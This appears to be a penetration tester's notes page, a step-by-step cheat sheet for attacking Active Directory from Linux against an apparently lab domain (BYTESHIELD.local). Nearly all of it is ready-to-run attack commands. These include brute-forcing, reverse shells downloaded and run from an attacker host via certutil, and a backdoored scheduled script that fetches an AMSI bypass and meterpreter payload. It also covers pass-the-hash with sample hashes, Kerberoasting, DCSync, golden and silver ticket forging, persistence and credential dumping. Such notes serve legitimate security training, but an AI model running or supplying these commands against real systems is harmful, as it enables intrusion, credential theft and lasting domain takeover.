---
layout: notes
permalink: /notes/ad/linuxad/
title: Attacking Active Directory from Linux
---

## 1. Key Tools:
- Nmap – for port scanning and service detection  
- Enum4linux – for Linux-based AD enumeration  
- PowerView.py – Python implementation for AD enumeration
- CrackMapExec (CME) – for post-exploitation and lateral movement  
- Kerbrute – for brute-forcing Kerberos authentication  
- impacket – a Python library for low-level network protocol manipulation  
- Windapsearch, Ldapsearch, Rpcclient – additional tools for enumerating AD  
- BloodHound – for visualizing AD trust relationships

## 2. Network Enumeration
### 2.1 Nmap Port Scanning

```bash
# Nmap SYN Scan on Local Subnet
nmap -sS -nvv -T4 192.168.2.0/24

# Full Port Scan (all ports, open only)
nmap -p- 192.168.0.147 -T5 --open

# Aggressive Fingerprinting (Optional):
nmap -sV -O -sC 192.168.2.X

# Top 1000 Ports Scan with Version and Default Scripts
nmap 192.168.0.147 -sV -sC

# SQL Server Focused Scan
nmap -p 1433 --script ms-sql-info 192.168.0.147
nmap -p1433 --script ms-sql-ntlm-info 192.168.0.147
```

### 2.2 SMB and NetBIOS (NBT) Enumeration
```bash
# SMB Null Session with smbclient:
smbclient -L \\192.168.0.147 -N

# Access share
smbclient -N \\\\192.168.2.21\\files

# SMB Enumeration with smbmap:
smbmap -H 192.168.0.147

# NetBIOS Scan:
nbtscan 192.168.0.147

# SMB Shares Enumeration Using Nmap Script:
nmap --script smb-enum-shares -p 139,445 192.168.0.147

# msfconsole
msf5 > use auxiliary/scanner/smb/smb_enumshares
msf5 auxiliary(scanner/smb/smb_enumshares) > set RHOSTS 192.168.2.2,21,169,78,168,35
msf5 auxiliary(scanner/smb/smb_enumshares) > run
```

### 2.3 Get current domain and basic AD info from Linux
```bash
# Check domain name anonymously via SMB
crackmapexec smb <target_ip> -d '' -u '' -p ''

# Enumerate SIDs anonymously (Impacket)
impacket-lookupsid -no-pass <target_ip>

# Anonymous LDAP query for domain info
ldapsearch -H ldap://<target_ip> -x -b "" -s base "(objectclass=*)"

# Collect AD data with BloodHound (anonymous)
bloodhound-python -u '' -p '' -d <domain> -c All <target_ip> 
```

## 3. Brute Forcing and Credential Attacks
### 3.1 SQL Server Brute Force
```bash
# Nmap Brute Force with ms-sql-brute:
nmap -p1433 --script ms-sql-brute --script-args "userdb=users.txt,passdb=/usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt" 192.168.0.147

# Hydra for MSSQL:
hydra -L users.txt -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt 192.168.0.147 mssql

# CrackMapExec for MSSQL Brute Force:
crackmapexec mssql 192.168.0.147 --local-auth -u users.txt -p /usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt
```

## 4. Code Execution and Foothold Establishment
### 4.1 Command Execution via CrackMapExec
```bash
# Enumerating Local Users:
crackmapexec mssql 192.168.0.147 --local-auth -u sa -p PE#5GZ29PTZMSE -x "net user"

# Enumerating Domain Users:
crackmapexec mssql 192.168.0.147 --local-auth -u sa -p PE#5GZ29PTZMSE -x "net user /dom"

# Basic OS Command Execution:
crackmapexec mssql 192.168.0.147 --local-auth -u sa -p PE#5GZ29PTZMSE -x "ipconfig"
crackmapexec mssql 192.168.0.147 --local-auth -u sa -p PE#5GZ29PTZMSE -x "hostname"
crackmapexec mssql 192.168.0.147 --local-auth -u sa -p PE#5GZ29PTZMSE -x "whoami"
```

### 4.2 Reverse Shell and File Transfer
```bash
# Generating a Reverse Shell Executable with msfvenom:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.101 LPORT=8443 -f exe > Shell.exe

# Starting a Python HTTP Server:
python3 -m http.server 80

# Downloading the Reverse Shell on the Target:
crackmapexec mssql 192.168.0.147 --local-auth -u sa -p PE#5GZ29PTZMSE -x "certutil -urlcache -f http://192.168.0.101/Shell.exe C:\Users\Public\Shell.exe"

# Executing the Reverse Shell:
crackmapexec mssql 192.168.0.147 --local-auth -u sa -p PE#5GZ29PTZMSE -x "C:\Users\Public\Shell.exe"

# Privilege Escalation with PrintSpoofer:
PrintSpoofer.exe -i -c cmd
```

### 4.3 Payload delivery via SMB share + Scheduled Task
```bash
# Suppose we found cleanup.ps1 on SMB Share
# Check write access
echo hello > hello.txt
smbclient -N \\\\192.168.2.21\\files
smb: \> cd maintenance
smb: \maintenance\> put hello.txt

# Generate payload
msfvenom -p windows/x64/meterpreter_reverse_tcp -f psh LHOST=192.168.2.1 -o payload.ps1

# edit cleanup.ps1 locally
iex (iwr -UseBasicParsing http://192.168.2.1:8000/amsibypass);
iex (iwr -UseBasicParsing http://192.168.2.1:8000/payload.ps1)

# upload modified cleanup.ps1 file
smb: \maintenance\> put cleanup.ps1

# Serve amsibypass file
root@kali:~/Desktop/tools# python -m SimpleHTTPServer 8000

# Setup metasploit listener
msfconsole -q
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 192.168.2.1
msf5 exploit(multi/handler) > exploit
```

## 5. Post-Exploitation: Pivoting & Tunnelling
### 5.1 Port Forwarding with netsh
```bash
# Allowing Traffic on a Specific Port:
advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=192.168.0.147 localport=4455 action=allow

# Setting Up a Port Proxy:
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=192.168.0.147 connectport=445 connectaddress=10.10.1.13

# SMB Client Adjustments (Linux):
nano /etc/samba/smb.conf
/etc/init.d/smbd restart
```

### 5.2 Pivoting with Chisel
```bash
# Downloading and Preparing Chisel on Linux:
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_arm64.gz -O chisel.gz -q
gunzip chisel.gz
chmod +x chisel

# Downloading Chisel for Windows:
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz -O chisel-w.gz -q
gunzip chisel-w.gz

# Transferring Chisel to the Target:
certutil -urlcache -f http://192.168.0.101/chisel.exe C:\Users\Public\chisel.exe

# Establishing Reverse Tunnelling:
./chisel server --reverse --port 9999
chisel.exe client 192.168.0.101:9999 R:1080:socks

# Scanning the Internal Network via Proxychains:
proxychains4 -q nmap -sT 10.10.1.13 -sV -sC --top-ports=20 -T4 --open
```

## 6. Domain Enumeration
### 6.1 Using Powerview and Windapsearch
```bash
# Enumerate Domain Users with Powerview:
proxychains4 -q powerview BYTESHIELD/p.brown:'P.Password1!'@10.10.1.13 Get-DomainUser -Select 1

# Detailed User Filtering:
Get-DomainUser -Select samaccountname,memberof,description

# Windapsearch Examples:
proxychains4 -q python3 windapsearch.py -d BYTESHIELD.local -u "BYTESHIELD\\p.brown" -p 'P.Password1!' -U
proxychains4 -q python3 windapsearch.py -d BYTESHIELD.local -u "BYTESHIELD\\p.brown" -p 'P.Password1!' --user-spns
proxychains4 -q python3 windapsearch.py -d BYTESHIELD.local -u "BYTESHIELD\\p.brown" -p 'P.Password1!' --da

# Enumerate Domain with AD Module
# From meterpreter shell:
upload /root/Desktop/tools/ADModule-master.zip C:\Users\fileadmin\Downloads
# Then, on the target:
Expand-Archive C:\Users\fileadmin\Downloads\ADModule-master.zip
Import-Module C:\Users\fileadmin\Downloads\ADModule-master\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
# Get Domain Information:
Get-ADDomain
# Enumerate Users:
Get-ADUser -Filter *
#Enumerate Computers:
Get-ADComputer -Filter *

# Using SharpView (Uploaded via Meterpreter):
upload /root/Desktop/tools/SharpView.exe C:\Users\fileadmin\Downloads
# Then from a shell:
SharpView.exe Get-DomainUser -domain cola
```

### 6.2 Rpcclient Enumeration
```bash
# Using Rpcclient for Domain Info:
proxychains4 -q rpcclient -U p.brown 10.10.1.13
srvinfo
querydominfo
enumdomusers
enumdomgroups
```

### 6.3 BloodHound Ingestion
```bash
# Collecting Data for BloodHound:
proxychains4 bloodhound-python -v --zip -c All -d BYTESHIELD.local -u 'p.brown' -p 'P.Password1!' --dns-tcp -ns 10.10.1.13 -dc ROOT-DC01.BYTESHIELD.local
```

## 7. Domain Privilege Escalation
### 7.1 AS-REP Roasting
```bash
# Extracting AS-REP Responses:
proxychains4 -q impacket-GetNPUsers BYTESHIELD.local/mark.joseph -no-pass
```

### 7.2 Kerberoasting
```bash
# Retrieving Service Tickets:
proxychains4 -q impacket-GetUserSPNs BYTESHIELD.local/p.brown
proxychains4 -q impacket-GetUserSPNs BYTESHIELD.local/p.brown -request

# Cracking the TGS Ticket:
.\hashcat.exe -a 0 -m 13100 .\service_tgs.txt .\PasswordList.txt
```

### 7.3 Pass-the-Hash (PtH) Attacks
```bash
# PtH Using CrackMapExec on SMB:
proxychains4 -q crackmapexec smb 10.10.1.13 -u David.williams -H 9d0615b4cbfc6a2c149059eddcf156b0 --shares
proxychains4 -q crackmapexec smb 10.10.1.13 -u David.williams -H 9d0615b4cbfc6a2c149059eddcf156b0 -x "whoami"

# PtH with MSSQL and Evil-WinRM:
proxychains4 -q crackmapexec mssql 10.10.1.13 -u Jessica.williams -H 0ff636843056b5a523b840944794dbb4 -x "whoami"
proxychains4 -q evil-winrm -i 10.10.1.13 -u jessica.williams -H 0ff636843056b5a523b840944794dbb4
```

### 7.4 MSSQL Server Privilege Escalation
```bash
# Impersonation and Role Verification:
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
EXECUTE AS LOGIN = 'Kevin';
SELECT IS_SRVROLEMEMBER('sysadmin');
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');

# Enabling xp_cmdshell:
sp_configure 'show advanced options', '1';
RECONFIGURE;
sp_configure 'xp_cmdshell', '1';
RECONFIGURE;
EXEC master..xp_cmdshell 'whoami';
Activates command shell execution on the SQL Server to run OS commands. 

# File Transfer and Shell Execution via MSSQL:
EXEC master..xp_cmdshell "certutil -urlcache -f http://192.168.0.101/Shell.exe C:\Users\Public\Shell.exe";
EXEC master..xp_cmdshell "certutil -urlcache -f http://192.168.0.101/Shell.exe C:\Users\Public\Shell.exe";
PrintSpoofer.exe -i -c cmd
```

## 8. Active Directory Persistence
### 8.1 Golden Ticket Attacks
```bash
# DCSync to Retrieve krbtgt Hash:
proxychains4 -q impacket-secretsdump BYTESHIELD.local/David.Williams@10.10.1.13 -just-dc-user BYTESHIELD/krbtgt

# Constructing a Golden Ticket:
proxychains4 -q impacket-ticketer -nthash cc33e56f29f7f028240c94009626a68e -domain BYTESHIELD.local -domain-sid S-1-5-21-2650123447-3108711000-1796582875 -extra-sid <extra-sid> hacker
export KRB5CCNAME=fakeuser.ccache

# Using the Golden Ticket:
proxychains4 -q impacket-psexec fakeuser@ROOT-DC01.BYTESHIELD.local -k -no-pass -target-ip 10.10.1.13
```

### 8.2 Silver Ticket Attacks
```bash
# Creating a Silver Ticket:
proxychains4 -q impacket-ticketer -nthash 0203b4df11a0f99f631a93f4c4cbfddb -domain-sid S-1-5-21-2650123447-3108711000-1796582875 -domain BYTESHIELD.local -spn cifs/FILE-SERVER.BYTESHIELD.local Administrator
export KRB5CCNAME=Administrator.ccache

# Using the Silver Ticket for Lateral Movement:
proxychains4 -q impacket-psexec Administrator@FILE-SERVER.BYTESHIELD.local -k -no-pass -target-ip 10.10.1.16
```

### 8.3 AdminSDHolder Abuse (Persistence Technique)
```powershell
# ACL Enumeration and Modification. Uses AD PowerShell modules to inspect and modify ACLs for persistence through AdminSDHolder abuse. 
Get-DomainObjectAcl -ResolveGUIDs -Where "SecurityIdentifier contains Jessica.Williams"
Set-DomainUserPassword -Identity Samantha.Rawland -AccountPassword 'SR.Password123!‘
Add-DomainGroupMember -Identity 'StdBy Admin' -Members Jessica.Williams
Get-DomainGroupMember -Identity 'StdBy Admin'
```

## 9. Cross-Forest Trust Attacks
```powershell
# Enumerate Trust Relationships:
Get-DomainTrust
Get-DomainUser -Domain TRI.BYTESHIELD.local -Properties samaccountname,memberof

# Golden Ticket in Cross-Forest Scenario:
kerberos::golden /user:fake /domain:TRI.BYTESHIELD.local /sid:S-1-5-21-961384531-1508825278-244064522 /krbtgt:d4c73ff9e62e80ac282ff90aa7c7e145 /sids:S-1-5-21-2650123447-3108711000-1796582875-519 /ptt
export KRB5CCNAME=hacker.ccache
proxychains4 -q impacket-psexec hacker@ROOT-DC01.BYTESHIELD.local -k -no-pass -target-ip 10.10.1.13
```

## 10. Additional Techniques
### 10.1 LLMNR / NBNS Attacks
```bash
# Capturing NTLM Hashes with Responder:
Responder -I eth0 -wd

# Offline Hash Cracking:
.\hashcat.exe -a 0 -m 5600 .\NThashes.txt .\PasswordList.txt
```

### 10.2 MSSQL Server Impersonation (Nested Impersonation)
```bash
# Check and Elevate MSSQL Privileges:
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
EXECUTE AS LOGIN = 'Kevin';
SELECT IS_SRVROLEMEMBER('sysadmin');
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin'); 

# Reverse Shell Upload via MSSQL:
EXEC master..xp_cmdshell "certutil -urlcache -f http://192.168.0.101/Shell.exe C:\Users\Public\Shell.exe";
PrintSpoofer.exe -i -c cmd
```

### 10.3 Pass-the-Hash (Revisited)
```bash
# Using PtH with Impacket-psexec, Authenticates to a target using NTLM hash without cracking the clear-text password. 
proxychains4 -q impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:9d0615b4cbfc6a2c149059eddcf156b0 David.Williams@10.10.1.13
```

### 10.4 Extracting Credentials
```bash
# Dump NTLM hashes from SAM or LSASS
impacket-secretsdump -dc-ip <dc_ip> <domain>/<user>:<password>@<target_ip>

# Use Mimikatz via Impacket to extract creds
impacket-mimikatz '<domain>\<user>:<password>@<target_ip>' -k

# Using Kiwi in meterpreter session
meterpreter > load kiwi
meterpreter > creds_all

# Dump SAM hashes via SMB
crackmapexec smb <target_ip> -u <user> -p <password> --sam  

# Request a TGT for Kerberos attacks
impacket-getTGT -dc-ip <dc_ip> <domain>/<user>:<password>  
```